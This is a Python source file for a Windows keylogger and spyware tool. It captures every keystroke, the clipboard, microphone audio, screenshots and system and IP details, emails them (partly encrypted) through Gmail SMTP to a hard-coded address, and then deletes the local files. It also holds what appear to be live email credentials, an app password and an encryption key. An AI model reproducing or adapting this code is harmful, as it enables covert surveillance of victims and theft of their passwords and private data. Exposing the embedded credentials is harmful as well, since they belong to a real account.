import os
import smtplib
import socket
import platform
import win32clipboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
import time
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# Information file names
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Timing and email settings
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "aftabkhan11480@gmail.com"  # Enter disposable email here
email_password = "ousddhwzwztmhdhn"  # Enter the app-specific password here

username = getpass.getuser()
destination_address = "khanaftab1793@gmail.com"  # Enter the email address you want to send your information to
encryption_key = "SLuuVhzW238qkC_MMmTuG9jGACRVH6DkrV0Pg0ASo_Q="  # Generate an encryption key from the Cryptography # folder

file_path = "C:\\Users\\AFTAB KHAN\\Downloads\\Software Key Logger\\Software KeyLogger\\"  # Updated file path
extend = "\\"
file_merge = file_path + extend

# Ensure the directory exists
if not os.path.exists(file_path):
    os.makedirs(file_path)

def send_email(filename, attachment, to_address):
    try:
        from_address = email_address
        msg = MIMEMultipart()
        msg['From'] = from_address
        msg['To'] = to_address
        msg['Subject'] = "Log File"
        body = "Key Logger Log Files"
        msg.attach(MIMEText(body, 'plain'))

        with open(attachment, 'rb') as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {filename}")
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_address, email_password)
        server.sendmail(from_address, to_address, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def computer_information():
    try:
        with open(file_merge + system_information, "a") as sys_info_file:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                sys_info_file.write("Public IP Address: " + public_ip + '\n')
            except Exception as e:
                sys_info_file.write("Couldn't get Public IP Address (most likely max query)\n")
                sys_info_file.write(str(e) + '\n')

            sys_info_file.write("Processor: " + platform.processor() + '\n')
            sys_info_file.write("System: " + platform.system() + " " + platform.version() + '\n')
            sys_info_file.write("Machine: " + platform.machine() + '\n')
            sys_info_file.write("Hostname: " + hostname + '\n')
            sys_info_file.write("Private IP Address: " + ip_address + '\n')
    except Exception as e:
        print(f"Failed to gather computer information: {e}")

def copy_clipboard():
    try:
        with open(file_merge + clipboard_information, "a") as clipboard_file:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                clipboard_file.write("Clipboard Data: \n" + pasted_data + '\n')
            except Exception as e:
                clipboard_file.write("Clipboard could not be copied\n")
                clipboard_file.write(str(e) + '\n')
    except Exception as e:
        print(f"Failed to copy clipboard: {e}")

def microphone():
    try:
        fs = 44100
        seconds = microphone_time
        my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_merge + audio_information, fs, my_recording)
    except Exception as e:
        print(f"Failed to record microphone: {e}")

def screenshot():
    try:
        img = ImageGrab.grab()
        img.save(file_merge + screenshot_information)
    except Exception as e:
        print(f"Failed to capture screenshot: {e}")

def write_file(log_keys):
    try:
        with open(file_merge + keys_information, "a") as key_file:
            for key in log_keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    key_file.write('\n')
                elif k.find("Key") == -1:
                    key_file.write(k)
    except Exception as e:
        print(f"Failed to write key log: {e}")

def on_press(key):
    global log_keys, key_count, current_time
    try:
        print(key)
        log_keys.append(key)
        key_count += 1
        current_time = time.time()

        if key_count >= 1:
            key_count = 0
            write_file(log_keys)
            log_keys = []
    except Exception as e:
        print(f"Error on key press: {e}")

def on_release(key):
    global current_time, stop_time
    try:
        if key == Key.esc or current_time > stop_time:
            return False
    except Exception as e:
        print(f"Error on key release: {e}")

def main():
    global log_keys, key_count, current_time, stop_time

    computer_information()
    copy_clipboard()
    microphone()
    screenshot()

    number_of_iterations = 0
    current_time = time.time()
    stop_time = time.time() + time_iteration

    while number_of_iterations < number_of_iterations_end:
        key_count = 0
        log_keys = []

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if current_time > stop_time:
            with open(file_merge + keys_information, "w") as key_file:
                key_file.write(" ")

            screenshot()
            send_email(screenshot_information, file_merge + screenshot_information, destination_address)
            copy_clipboard()

            number_of_iterations += 1
            current_time = time.time()
            stop_time = time.time() + time_iteration

    files_to_encrypt = [
        file_merge + system_information,
        file_merge + clipboard_information,
        file_merge + keys_information
    ]

    encrypted_file_names = [
        file_merge + system_information_e,
        file_merge + clipboard_information_e,
        file_merge + keys_information_e
    ]

    fernet = Fernet(encryption_key)

    for count, file_to_encrypt in enumerate(files_to_encrypt):
        try:
            with open(file_to_encrypt, 'rb') as file:
                data = file.read()

            encrypted = fernet.encrypt(data)

            with open(encrypted_file_names[count], 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

            send_email(encrypted_file_names[count], encrypted_file_names[count], destination_address)
        except Exception as e:
            print(f"Failed to encrypt and send file: {e}")

    time.sleep(120)

    delete_files = [
        system_information,
        clipboard_information,
        keys_information,
        screenshot_information,
        audio_information
    ]

    for file in delete_files:
        try:
            if os.path.exists(file_merge + file):
                os.remove(file_merge + file)
        except Exception as e:
            print(f"Failed to delete file: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Program interrupted by user")
